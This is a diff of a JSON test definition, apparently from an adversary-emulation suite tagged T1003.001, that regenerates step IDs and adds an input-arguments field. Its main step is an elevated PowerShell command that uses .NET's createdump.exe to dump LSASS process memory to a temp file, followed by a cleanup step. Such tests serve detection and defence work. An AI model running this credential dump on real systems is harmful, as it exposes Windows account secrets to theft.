@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "49619435-55b5-4a52-b3da-f45923eb0d83",
+      "id": "ec4300a3-977f-4eda-b6c1-e23915d0ed5b",
       "type": "execute-command",
       "data": {
         "command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\n\u0026 \"$exePath\" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id",
@@ -16,7 +16,7 @@
       "elevation_required": true
     },
     {
-      "id": "4085309c-9e5b-4357-bbba-bef8211bf659",
+      "id": "7b524cf1-ca70-452b-9a56-7cf0518df314",
       "type": "execute-command",
       "data": {
         "command": "Remove-Item $env:Temp\\dotnet-lsass.dmp -ErrorAction Ignore",
@@ -25,7 +25,7 @@
       "elevation_required": true
     },
     {
-      "id": "81048648-66a1-4032-aa5d-658653c17e29",
+      "id": "ea3e456a-9e4c-47f3-9616-b13cd1cb281e",
       "name": "Check dependency 1/1",
       "description": ".Net v5 must be installed\n",
       "type": "execute-command",
@@ -36,7 +36,7 @@
       "elevation_required": true
     },
     {
-      "id": "5e377760-97cd-410b-a989-8e371459df68",
+      "id": "015b949c-84dc-4880-8c92-f295950c1aa6",
       "name": "Resolve dependency 1/1",
       "description": ".Net v5 must be installed\n",
       "type": "execute-command",
@@ -47,7 +47,7 @@
       "elevation_required": true
     },
     {
-      "id": "c4f2fe48-3bc6-4167-924e-c726cc0e7d33",
+      "id": "03e13757-0922-4edb-b0b6-9ae723391167",
       "name": "Re-check dependency 1/1",
       "description": ".Net v5 must be installed\n",
       "type": "execute-command",
@@ -60,38 +60,39 @@
   ],
   "flows": [
     {
-      "s": "49619435-55b5-4a52-b3da-f45923eb0d83",
+      "s": "ec4300a3-977f-4eda-b6c1-e23915d0ed5b",
       "p": "on-success",
-      "o": "4085309c-9e5b-4357-bbba-bef8211bf659"
+      "o": "7b524cf1-ca70-452b-9a56-7cf0518df314"
     },
     {
-      "s": "49619435-55b5-4a52-b3da-f45923eb0d83",
+      "s": "ec4300a3-977f-4eda-b6c1-e23915d0ed5b",
       "p": "on-failure",
-      "o": "4085309c-9e5b-4357-bbba-bef8211bf659"
+      "o": "7b524cf1-ca70-452b-9a56-7cf0518df314"
     },
     {
-      "s": "81048648-66a1-4032-aa5d-658653c17e29",
+      "s": "ea3e456a-9e4c-47f3-9616-b13cd1cb281e",
       "p": "on-success",
-      "o": "49619435-55b5-4a52-b3da-f45923eb0d83"
+      "o": "ec4300a3-977f-4eda-b6c1-e23915d0ed5b"
     },
     {
-      "s": "81048648-66a1-4032-aa5d-658653c17e29",
+      "s": "ea3e456a-9e4c-47f3-9616-b13cd1cb281e",
       "p": "on-failure",
-      "o": "5e377760-97cd-410b-a989-8e371459df68"
+      "o": "015b949c-84dc-4880-8c92-f295950c1aa6"
     },
     {
-      "s": "5e377760-97cd-410b-a989-8e371459df68",
+      "s": "015b949c-84dc-4880-8c92-f295950c1aa6",
       "p": "on-success",
-      "o": "c4f2fe48-3bc6-4167-924e-c726cc0e7d33"
+      "o": "03e13757-0922-4edb-b0b6-9ae723391167"
     },
     {
-      "s": "c4f2fe48-3bc6-4167-924e-c726cc0e7d33",
+      "s": "03e13757-0922-4edb-b0b6-9ae723391167",
       "p": "on-failure",
-      "o": "49619435-55b5-4a52-b3da-f45923eb0d83"
+      "o": "ec4300a3-977f-4eda-b6c1-e23915d0ed5b"
     }
   ],
   "tags": [
     "T1003",
     "T1003.001"
-  ]
+  ],
+  "input_arguments": null
 }
